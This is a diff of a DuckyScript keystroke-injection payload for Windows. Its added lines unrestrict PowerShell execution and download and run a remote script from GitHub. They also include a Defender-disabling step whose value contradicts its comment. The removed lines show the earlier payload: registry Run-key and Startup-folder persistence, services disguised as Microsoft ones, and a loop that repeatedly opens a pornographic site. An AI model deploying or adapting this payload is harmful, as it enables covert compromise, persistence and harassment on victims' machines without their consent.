@@ -10,40 +10,22 @@ SHIFT TAB
 DELAY 500
 ENTER
 DELAY 2000
+REM Turn off windows defender
+STRING Set-MpPreference -DisableRealtimeMonitoring $false
+ENTER
+DELAY 500
 REM Unrestrict execution policy
 STRING Set-ExecutionPolicy Unrestricted -Force
 ENTER
 DELAY 500
-REM Create netdiag script w/registry run key that recreates the main startup script
-STRING New-Item  -ItemType File -Path "C:\Windows\Help\NetworkDiagnostic.ps1"
+REM Download NetDiag Script
+STRING Invoke-WebRequest -Uri 'https://raw.githubusercontent.com/lfgberg/erm/master/NetworkDiagnostic.ps1' -OutFile 'C:\Windows\Help\NetworkDiagnostic.ps1'
 ENTER
-DELAY 500
-STRING Set-Content -Path "C:\Windows\Help\NetworkDiagnostic.ps1" -Value "Invoke-WebRequest -Uri 'https://i.imgur.com/jArJz56.jpeg' -OutFile 'C:\Windows\secpol.jpeg'; Set-ItemProperty -Path 'HKCU:\Control Panel\Desktop\' -Name Wallpaper -Value 'C:\Windows\secpol.ps1'; RUNDLL32.EXE user32.dll,UpdatePerUserSystemParameters; if(-NOT(Test-Path 'HKCU:\Software\Microsoft\Windows\CurrentVersion\Run')){New-Path 'HKCU:\Software\Microsoft\Windows\CurrentVersion\Run' -Force | Out-Null};New-ItemProperty -Path 'HKCU:\Software\Microsoft\Windows\CurrentVersion\Run' -Name NetworkDiagnostic -Value C:\Windows\Help\NetworkDiagnostic.ps1;New-Item -ItemType File -Path '$env:appdata\Microsoft\Windows\Start Menu\Programs\StartUp\WMIsvc.ps1';Set-Content -Path '$env:appdata\Microsoft\Windows\Start Menu\Programs\StartUp\WMIsvc.ps1' -Value \"Invoke-WebRequest -Uri 'https://i.imgur.com/jArJz56.jpeg' -OutFile 'C:\Windows\secpol.jpeg'; Set-ItemProperty -Path 'HKCU:\Control Panel\Desktop\' -Name Wallpaper -Value 'C:\Windows\secpol.jpeg'; RUNDLL32.EXE user32.dll,UpdatePerUserSystemParameters; while($true){explorer.exe https://porn.tgm.one; powershell.exe -File %appdata%\Microsoft\Windows\Start Menu\Programs\StartUp\WMIsvc.ps1}\""
-ENTER
-DELAY 500
-REM Create services
-STRING New-Service -Name "InstallServlce" -BinaryPathName "powershell.exe -NoProfile -ExecutionPolicy Bypass -File C:\Windows\Help\NetworkDiagnostic.ps1" -Description "Microsoft Store Install Service"
-ENTER
-DELAY 500
-STRING Set-Service -Name "InstallServlce" -StartupType Automatic
-ENTER
-DELAY 500
-STRING New-Service -Name "GraphcsPrfSvc" -BinaryPathName "powershell.exe -NoProfile -ExecutionPolicy Bypass -File C:\Windows\Help\NetworkDiagnostic.ps1" -Description "Microsoft Store Install Service"
-ENTER
-DELAY 500
-STRING Set-Service -Name "GraphcsPrfSvc" -StartupType Automatic
-ENTER
-DELAY 500
-STRING New-Service -Name "NdAutoSetup" -BinaryPathName "powershell.exe -NoProfile -ExecutionPolicy Bypass -File C:\Windows\Help\NetworkDiagnostic.ps1" -Description "Microsoft Store Install Service"
-ENTER
-DELAY 500
-STRING Set-Service -Name "NdAutoSetup" -StartupType Automatic
-ENTER
-DELAY 500
-REM Run the script, creating the registry key which will start netdiag, and creating the porn startup script
+DELAY 1000
+REM Run the script
 STRING powershell.exe -File "C:\Windows\Help\NetworkDiagnostic.ps1"
 ENTER
-REM Start the script
-REM DELAY 500
-REM STRING powershell.exe -File "$env:appdata\Microsoft\Windows\Start Menu\Programs\StartUp\WMIsvc.ps1"
-REM ENTER
+DELAY 5000
+REM Close
+STRING exit
+ENTER
